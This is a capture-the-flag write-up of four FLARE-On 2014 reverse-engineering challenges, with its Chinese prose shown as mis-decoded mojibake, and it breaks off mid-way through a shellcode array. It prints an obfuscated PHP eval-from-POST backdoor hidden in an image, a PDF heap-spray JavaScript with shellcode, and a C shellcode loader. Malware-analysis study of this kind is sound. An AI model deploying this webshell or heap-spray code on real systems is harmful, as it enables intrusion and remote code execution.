<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">The FLARE On Challengeé¢˜è§£</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">g3t</a> <span class="bull">Â·</span> <time title="2014/09/15 12:01" ui-time="" datetime="2014/09/15 12:01" class="published ng-binding ng-isolate-scope">2014/09/15 12:01</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>ç¬¬ä¸€é¢˜</h2><p>è¿™ä¸ªé¢˜ç›®æ˜¯ä¸ª .Net ç¨‹åº, è®©æ ¹æ®è¿™ä¸ªç¨‹åºæ‰¾å‡ºä¸€ä¸ªé‚®ç®±åœ°å€, ç„¶åç»™å…¶å‘é‚®ä»¶, å®ƒå°±ä¼šå›å¤ä½ ä¸‹ä¸€ä¸ªé¢˜ç›®.</p><p>é¦–å…ˆ, è¿™ä¸ªç¨‹åºæ˜¯ä¸ª64ä½çš„è‡ªè§£å‹ç¨‹åº, ç„¶å, è§£å‹å‡ºæ¥åæ˜¯ä¸ª .Net ç¨‹åº.</p><p>æ‹–åˆ° <strong>ILSpy</strong> ä¸­çœ‹äº†çœ‹, æ²¡æœ‰å‘ç°ä»€ä¹ˆæœºå…³, ç­”æ¡ˆåº”è¯¥é€šè¿‡å‡½æ•° <code>btnDecode_Click</code> è·å–, äºæ˜¯å°†å‡½æ•° <code>btnDecode_Click</code> æ‰£å‡ºæ¥, æ‰“å°ä¸­é—´å˜é‡, ç¬¬ä¸€æ­¥è½¬æ¢å°±æ˜¯ç»“æœäº†, å…¶é‚®ç®±åœ°å€ä¸º:</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6152130c0009065213054f0351034f0551060421070d0013044c0e0f4f020e0c">[email&#160;protected]</a>
</code></pre><p>é™„æºä»£ç :</p><pre><code>#!c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace flare_on_1
{
    class Program
    {
        //private void btnDecode_Click(object sender, EventArgs e)
        static void btnDecode_Click()
        {
            //this.pbRoge.Image = Resources.bob_roge;
            //byte[] buffer = Resources.dat_secret;
            byte[] buffer = {
                0xA1, 0xB5, 0x44, 0x84, 0x14, 0xE4, 0xA1, 0xB5, 0xD4, 0x70, 0xB4, 0x91, 0xB4, 0x70, 0xD4, 0x91,
                0xE4, 0xC4, 0x96, 0xF4, 0x54, 0x84, 0xB5, 0xC4, 0x40, 0x64, 0x74, 0x70, 0xA4, 0x64, 0x44
            };

            string str = "";
            for (int i = 0; i &lt; buffer.Length; i++)
            {
                byte num2 = buffer[i];
                str = str + ((char)(((num2 &gt;&gt; 4) | ((num2 &lt;&lt; 4) &amp; 240)) ^ 0x29));
            }
            str = str + "\0";
            Console.WriteLine(str);

            string str2 = "";
            for (int j = 0; j &lt; str.Length; j += 2)
            {
                str2 = str2 + str[j + 1] + str[j];
            }
            string str3 = "";
            for (int k = 0; k &lt; str2.Length; k++)
            {
                char ch1 = str2[k];
                str3 = str3 + ((char)(((byte)str2[k]) ^ 0x66));
            }
            //this.lbl_title.Text = str3;
        }

        static void Main(string[] args)
        {
            btnDecode_Click();
        }
    }
}
</code></pre><hr><h2>ç¬¬äºŒé¢˜</h2><p>æç¤ºè¯´ç«™ç‚¹è¢«é»‘äº†, åœ¨ <strong>home.html</strong> æºä»£ç ä¸­çœ‹åˆ°è¿™ä¸ª:</p><pre><code>&lt;?php include "img/flare-on.png" ?&gt;
</code></pre><p>å›¾ç‰‡ä¸­çš„PHPä»£ç :</p><pre><code>#!php
    &lt;?php $terms=array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "&lt;", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&amp;", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", "&gt;", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");$order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);$do_me="";for($i=0;$i&lt;count($order);$i++){$do_me=$do_me.$terms[$order[$i]];}eval($do_me); ?&gt;
</code></pre><p>å°† <code>$do_me</code> è¾“å‡ºå¹¶æ ¼å¼åŒ–:</p><pre><code>#!php
$_= \'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';
$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\';
$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
eval($___($__));
</code></pre><p>OK, è§£æ <code>$___</code> å’Œ <code>$__</code>:</p><pre><code>#!php
$___ = "base64_decode"
$__ = "$code=base64_decode($_);eval($code);"
</code></pre><p>æŒ‰ç…§è¦æ±‚å°†å˜é‡ <code>$_</code> æŒ‰ç…§ BASE64 è§£ç :</p><pre><code>#!php
if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) { eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"])); }
</code></pre><p>å­—ç¬¦ä¸² <code>\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D</code>ä¸º: a11DOTthatDOTjava5crapATflareDASHonDOTcom</p><p>æ›¿æ¢å¤§å†™å­—æ¯:</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="254414140b514d44510b4f4453441046574455654349445740084a4b0b464a48">[email&#160;protected]</a>
</code></pre><p>æ³¨æ„: æ˜¯ <code>a11</code> (æ•°å­—11) è€Œä¸æ˜¯ <code>all</code>.</p><hr><h2>ç¬¬ä¸‰é¢˜</h2><p>è¿™ä¸ªå°±æ˜¯ä¼ è¯´ä¸­çš„æ··æ·†/å…æ€/åé€†å‘??? è¿™ä¸ªç¨‹åºåœ¨ IDA ä¸­åªèƒ½çœ‹åˆ°ä¸€ä¸ªé•¿é•¿çš„èµ‹å€¼/é‡å†™ç¨‹åºçš„ä»£ç . æ‹–åˆ°ODä¸­, å‘ç°ç¨‹åºåœ¨è¿è¡Œæ—¶ä¸æ–­çš„è§£å¯†/é‡å†™ç¨‹åº, æœ€ç»ˆåœ¨å†…å­˜ä¸­ç”Ÿæˆé‚®ç®±åœ°å€å¹¶å¼¹çª—.</p><pre><code>#!bash
0012FD21  42 72 6F 6B 65 6E 42 79 74 65 00 E6 FE 12 00 61  BrokenByte.çº©.a
0012FD31  61 61 61 61 61 6E 64 20 69 27 6D 20 73 70 65 6E  aaaaand i'm spen
0012FD41  74 00 00 7C FE 12 00 6F 6D 67 20 69 73 20 69 74  t..|?.omg is it
0012FD51  20 61 6C 6D 6F 73 74 20 6F 76 65 72 3F 21 3F 29   almost over?!?)
0012FD61  FE 12 00 C6 FD 12 00 6E 6F 70 61 73 61 75 72 75  ?.è®«.nopasauru
0012FD71  73 00 00 84 FD 12 00 9D 24 40 00 90 B2 23 E8 00  s..åŒŒ.?@.æƒ’#?
0012FD81  00 00 00 8B 34 24 83 C6 1C B9 DF 01 00 00 83 F9  ...?$å…¤æƒ¯..å‡’

0012FD91  00 74 07 80 36 66 46 49 EB F4 E9 10 00 00 00 61  .tâ‚¬6fFIåªµ?...a
0012FDA1  6E 64 20 73 6F 20 69 74 20 62 65 67 69 6E 73 68  nd so it beginsh
0012FDB1  75 73 00 00 68 73 61 75 72 68 6E 6F 70 61 89 E3  us..hsaurhnopaå¤ˆ
0012FDC1  E8 00 00 00 00 8B 34 24 83 C6 2D 89 F1 81 C1 8C  ?...?$å…¤-å¤ä¼­

0012FDD1  01 00 00 89 D8 83 C0 0A 39 D8 75 05 89 E3 83 C3  ..å£ºå….9è±¼å¤ˆå… 
0012FDE1  04 39 CE 74 08 8A 13 30 16 43 46 EB EB E9 31 00  9è¨?0CFè…š?.
0012FDF1  00 00 67 65 74 20 72 65 61 64 79 20 74 6F 20 67  ..get ready to g
0012FE01  65 74 20 6E 6F 70 27 65 64 20 73 6F 20 64 61 6D  et nop'ed so dam
0012FE11  6E 20 68 61 72 64 20 69 6E 20 74 68 65 20 70 61  n hard in the pa
0012FE21  69 6E 74 E8 00 00 00 00 8B 34 24 83 C6 1E B9 38  int?...?$å…¤?

0012FE31  01 00 00 83 F9 00 7E 0E 81 36 62 4F 6C 47 83 C6  ..å‡’.~?bOlGå…¤
0012FE41  04 83 E9 04 EB ED 8D 80 00 00 00 00 8D 80 00 00  å†®è… å´....å´..
0012FE51  00 00 90 90 90 90 68 72 3F 21 3F 68 20 6F 76 65  ..æ‚™æ‚™hr?!?h ove
0012FE61  68 6D 6F 73 74 68 74 20 61 6C 68 69 73 20 69 68  hmostht alhis ih
0012FE71  6F 6D 67 20 89 E3 E8 00 00 00 00 8B 34 24 83 C6  omg å¤ˆ?...?$å…¤
0012FE81  2D 89 F1 81 C1 D6 00 00 00 89 D8 83 C0 18 39 D8  -å¤ä¼­?..å£ºå…9
0012FE91  75 05 89 E3 83 C3 04 39 CE 74 08 8A 13 30 16 43  uå¤ˆå… 9è¨?0C
0012FEA1  46 EB EB E9 1D 00 00 00 73 75 63 68 2E 35 68 33  Fè…š?...such.5h3
0012FEB1  31 31 30 31 30 31 30 31 40 66 6C 61 72 65 2D 6F  <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b58484858485848584f5d3d9d4c7d098da">[email&#160;protected]</a>
0012FEC1  6E 2E 63 6F 6D 68 6E 74 00 00 68 20 73 70 65 68  n.comhnt..h speh
</code></pre><p>é‚®ç®±åœ°å€:</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="384b4d5b50160d500b0909080908090809785e54594a5d155756165b5755">[email&#160;protected]</a>
</code></pre><hr><h2>ç¬¬å››é¢˜</h2><p>APTæ”»å‡», é€šè¿‡åˆ©ç”¨Adobe PDF Readerçš„JSå‡½æ•°æ¼æ´æ„é€ å †å–·å°„æ‰§è¡Œshellcode...</p><p>ä¸‹é¢è¿™æ®µJSä»£ç å°±æ˜¯ä»è¿™ä¸ªPDFä¸­æå–å‡ºæ¥çš„:</p><pre><code>#!javascript
var HdPN = "";
var zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = "";
var IxTUQnOvHg = unescape("%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff");
var MPBPtdcBjTlpvyTYkSwgkrWhXL = "";


for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=128;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&gt;=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL += unescape("%ub32f%u3791");
ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv = MPBPtdcBjTlpvyTYkSwgkrWhXL + IxTUQnOvHg;
OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY = unescape("%ub32f%u3791");
fJWhwERSDZtaZXlhcREfhZjCCVqFAPS = 20;
fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA = fJWhwERSDZtaZXlhcREfhZjCCVqFAPS+ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length
while (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length&lt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY+=OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;
UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
MOysyGgYplwyZzNdETHwkru = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length-fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
while(MOysyGgYplwyZzNdETHwkru.length+fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA &lt; 0x40000) MOysyGgYplwyZzNdETHwkru = MOysyGgYplwyZzNdETHwkru+MOysyGgYplwyZzNdETHwkru+UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;
DPwxazRhwbQGu = new Array();
for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;100;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = MOysyGgYplwyZzNdETHwkru + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;


for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=142;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&gt;=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += unescape("%ub550%u0166");
bGtvKT = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length + 20
while (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length &lt; bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
Juphd = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, bGtvKT);
QCZabMzxQiD = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length-bGtvKT);
while(QCZabMzxQiD.length+bGtvKT &lt; 0x40000) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD+Juphd;
FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();
for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
</code></pre><p>OK, å˜é‡ <code>IxTUQnOvHg</code> å­˜å‚¨çš„å°±æ˜¯ shellcode äº†, å†™äº†ä¸ªpythonç¨‹åº, å°†è¯¥å˜é‡çš„å€¼è½¬æ¢ä¸º16è¿›åˆ¶çš„shellcode, ç„¶åå†ç”¨Cè¯­è¨€å†™äº†ä¸ªç¨‹åº, è°ƒç”¨è¿™ä¸ªshellcode, ç„¶åå¯ä»¥ç”¨ODè°ƒè¯•. ä¸€æ­¥æ­¥è·Ÿè¸ªæŒ‡å¯¼è°ƒç”¨MessageBoxAå‡½æ•°å¼¹å‡ºçª—å£æ˜¾ç¤ºé‚®ç®±åœ°å€. ç„¶è€Œæ›´ç®€å•çš„æ–¹æ³•æ˜¯ç›´æ¥åˆ†æ shellcode, å°†shellcodeæ‹–åˆ°IDAä¸­, åæ±‡ç¼–, çœ‹æ±‡ç¼–ä»£ç , å‘ç°ä¸‹é¢è¿™ä¸ªåœ°æ–¹æœ‰è¿™ä¹ˆå¤šçš„ <code>push</code> å’Œ <code>xor</code> æŒ‡ä»¤, è‚¯å®šæœ‰çŒ«è…», ä¹‹åç”¨ODè·Ÿè¿›å»è°ƒè¯•ä¸€ä¸‹å°±å¥½äº†...</p><pre><code>#!bash
0048335E    8B1424          mov edx, dword ptr ss:[esp]
00483361    8172 0B 16A3FB3&gt;xor dword ptr ds:[edx+0xB], 0x32FBA316
00483368    68 6F6D4500     push hello.00456D6F
0048336D    8172 17 AE45CF4&gt;xor dword ptr ds:[edx+0x17], 0x48CF45AE
00483374    68 6F6E2E63     push 0x632E6E6F
00483379    8172 23 10369FD&gt;xor dword ptr ds:[edx+0x23], 0xD29F3610
00483380    68 6172652D     push 0x2D657261
00483385    8172 2F F7A9A90&gt;xor dword ptr ds:[edx+0x2F], 0xCA9A9F7
0048338C    68 7340666C     push 0x6C664073
00483391    8172 3B BE93A94&gt;xor dword ptr ds:[edx+0x3B], 0x43A993BE
00483398    68 6C303174     push 0x7431306C
0048339D    8172 47 828A623&gt;xor dword ptr ds:[edx+0x47], 0x3B628A82
004833A4    68 6D2E7370     push 0x70732E6D
004833A9    8172 53 D647C0C&gt;xor dword ptr ds:[edx+0x53], 0xCCC047D6
004833B0    68 682E6433     push 0x33642E68
004833B5    8172 5F A3CA543&gt;xor dword ptr ds:[edx+0x5F], 0x3154CAA3
004833BC    68 77613163     push 0x63316177
004833C1    8BCC            mov ecx, esp
</code></pre><p>æ­¤æ—¶å·²ç»å¯ä»¥çœ‹åˆ°é‚®ç®±åœ°å€äº†, ç„¶è€Œä¹Ÿå¯ä»¥ é‚®ç®±åœ°å€æ˜¯:</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1d6a7c2c7e7533792e70336e6d712d2c696e5d7b717c6f78307273337e7270">[email&#160;protected]</a>
</code></pre><p>éšåçš„ä»£ç æ˜¯è°ƒç”¨ <code>MessageBoxA</code> å¼¹çª—å£çš„, é»˜è®¤æƒ…å†µä¼šå°†é‚®ç®±åœ°å€ä¸ <strong>0x46454542</strong> å¼‚æˆ–, å¯ä»¥ç›´æ¥è·³è¿‡, è¿™æ ·å¼¹çª—å°±å¯ä»¥æ‰“å°é‚®ç®±åœ°å€äº†:</p><pre><code>#!bash
004833C3    57              push edi
004833C4    53              push ebx
004833C5    51              push ecx
004833C6    57              push edi
004833C7    8BF1            mov esi, ecx
004833C9    89F7            mov edi, esi
004833CB    83C7 1E         add edi, 0x1E
004833CE    39FE            cmp esi, edi
004833D0    7D 0B           jge short hello.004833DD
004833D2    8136 42454546   xor dword ptr ds:[esi], 0x46454542
004833D8    83C6 04         add esi, 0x4
004833DB  ^ EB F1           jmp short hello.004833CE
004833DD    FFD0            call eax                                 ; user32.MessageBoxA
</code></pre><p>é™„Cè¯­è¨€ä»£ç :</p><pre><code>#!c
#include &lt;stdio.h&gt;

unsigned char shellcode[1024] = {
    0xF9, 0x72, 0x49, 0x46, 0x25, 0x15, 0x0D, 0x7F, 0x3C, 0x3D, 0x84, 0xE0, 0x2A, 0xD6, 0x39, 0xE1,
    0x4A, 0xA8, 0xB9, 0x76, 0x24, 0x98, 0x78, 0x73, 0x71, 0x7D, 0x7F, 0x75, 0x76, 0x20, 0xD4, 0x96,
    0x91, 0xBA, 0x70, 0x19, 0xF9, 0xB8, 0x32, 0xE2, 0x7B, 0x46, 0xA8, 0x9B, 0x01, 0xFE, 0xC6, 0xC7,
    0xC1, 0xE3, 0x24, 0x7E, 0x7C, 0x43, 0x80, 0xE1, 0x15, 0xB1, 0xB2, 0xB3, 0x66, 0x4F, 0xB6, 0x27,
    0x3C, 0x9F, 0x4E, 0x7A, 0x2D, 0x41, 0xBF, 0xBB, 0x05, 0x77, 0x28, 0xF5, 0x93, 0x92, 0x90, 0x99,
    0x98, 0xA9, 0x47, 0x0A, 0xEB, 0x14, 0x49, 0x3D, 0x4B, 0x48, 0x2F, 0x37, 0x8D, 0xB9, 0x78, 0x34,
